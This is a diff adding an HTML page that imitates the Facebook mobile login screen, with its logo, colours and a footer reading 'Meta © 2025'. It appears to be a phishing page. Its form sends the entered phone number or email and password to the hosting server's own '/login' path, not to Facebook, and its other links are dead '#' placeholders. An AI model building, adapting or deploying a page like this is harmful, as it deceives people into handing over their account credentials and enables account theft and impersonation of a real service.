@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook - Log In or Sign Up</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            font-family: Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            line-height: 1.34;
+            font-size: 14px;
+            padding: 0;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            padding: 16px;
+            max-width: 480px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        .header {
+            text-align: center;
+            margin: 20px 0 30px 0;
+        }
+        .logo {
+            width: 55px;
+            height: 84px;
+            margin: 0 auto;
+        }
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            padding: 16px;
+            margin-bottom: 16px;
+            width: 100%;
+        }
+        .form-group {
+            margin-bottom: 12px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 6px;
+            border: 1px solid #dddfe2;
+            font-size: 16px;
+            background: white;
+            color: #1c1e21;
+            font-family: inherit;
+        }
+        input[type="text"]::placeholder,
+        input[type="password"]::placeholder {
+            color: #8a8d91;
+        }
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+        .login-btn {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            color: white;
+            font-weight: bold;
+            padding: 12px;
+            width: 100%;
+            margin-bottom: 16px;
+            cursor: pointer;
+            font-family: inherit;
+        }
+        .login-btn:active {
+            background-color: #166fe5;
+            transform: scale(0.98);
+        }
+        .forgot-password {
+            color: #1877f2;
+            text-align: center;
+            display: block;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 16px;
+            font-weight: 500;
+        }
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .create-account {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            color: white;
+            font-weight: bold;
+            padding: 12px 16px;
+            margin: 0 auto;
+            display: block;
+            cursor: pointer;
+            font-family: inherit;
+        }
+        .create-account:active {
+            background-color: #36a420;
+            transform: scale(0.98);
+        }
+        .get-app {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #1c1e21;
+            line-height: 1.5;
+        }
+        .language-select {
+            text-align: center;
+            margin: 15px 0;
+            font-size: 14px;
+            color: #737373;
+            font-weight: 500;
+        }
+        .footer {
+            text-align: center;
+            padding: 16px;
+            background: white;
+            margin-top: auto;
+        }
+        .footer-links {
+            font-size: 12px;
+            color: #737373;
+            line-height: 1.6;
+        }
+        .footer-links a {
+            color: #737373;
+            text-decoration: none;
+            margin: 0 4px;
+        }
+        .meta-logo {
+            margin-top: 12px;
+            font-size: 12px;
+            color: #737373;
+            font-weight: bold;
+        }
+        @media (max-width: 320px) {
+            .container {
+                padding: 12px;
+            }
+            .card {
+                padding: 12px;
+            }
+            input[type="text"],
+            input[type="password"] {
+                padding: 12px 14px;
+                font-size: 15px;
+            }
+            .login-btn {
+                font-size: 16px;
+                padding: 11px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+                <path fill="#1877F2" d="M48 24C48 10.745 37.255 0 24 0S0 10.745 0 24c0 11.979 8.776 21.908 20.25 23.708v-16.77h-6.094V24h6.094v-5.288c0-6.015 3.583-9.337 9.065-9.337 2.625 0 5.372.469 5.372.469v5.906h-3.026c-2.981 0-3.911 1.85-3.911 3.75V24h6.656l-1.064 6.938H27.75v16.77C39.224 45.908 48 35.979 48 24z"/>
+            </svg>
+        </div>
+
+        <div class="card">
+            <form action="/login" method="POST">
+                <div class="form-group">
+                    <input type="text" name="username" placeholder="Mobile number or email" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-btn">Log in</button>
+                <a href="#" class="forgot-password">Forgot password?</a>
+                <div class="divider"></div>
+                <button type="button" class="create-account">Create new account</button>
+            </form>
+        </div>
+
+        <div class="get-app">
+            Get Facebook for browse faster.
+        </div>
+
+        <div class="language-select">
+            English (US)
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Sign Up</a> • 
+            <a href="#">Log In</a> • 
+            <a href="#">Messenger</a> • 
+            <a href="#">Facebook Lite</a> • 
+            <a href="#">Video</a> • 
+            <a href="#">Places</a> • 
+            <a href="#">Games</a> • 
+            <a href="#">Marketplace</a> • 
+            <a href="#">Meta Pay</a> • 
+            <a href="#">Meta Store</a> • 
+            <a href="#">Meta Quest</a> • 
+            <a href="#">Instagram</a> • 
+            <a href="#">Threads</a> • 
+            <a href="#">Fundraisers</a> • 
+            <a href="#">Services</a> • 
+            <a href="#">Voting Information Center</a> • 
+            <a href="#">Privacy Policy</a> • 
+            <a href="#">Privacy Center</a> • 
+            <a href="#">Groups</a> • 
+            <a href="#">About</a> • 
+            <a href="#">Create Ad</a> • 
+            <a href="#">Create Page</a> • 
+            <a href="#">Developers</a> • 
+            <a href="#">Careers</a> • 
+            <a href="#">Cookies</a> • 
+            <a href="#">Ad choices</a> • 
+            <a href="#">Terms</a> • 
+            <a href="#">Help</a> • 
+            <a href="#">Contact Uploading & Non-Users</a>
+        </div>
+        
+        <div class="meta-logo">
+            Meta © 2025
+        </div>
+    </div>
+</body>
+</html>
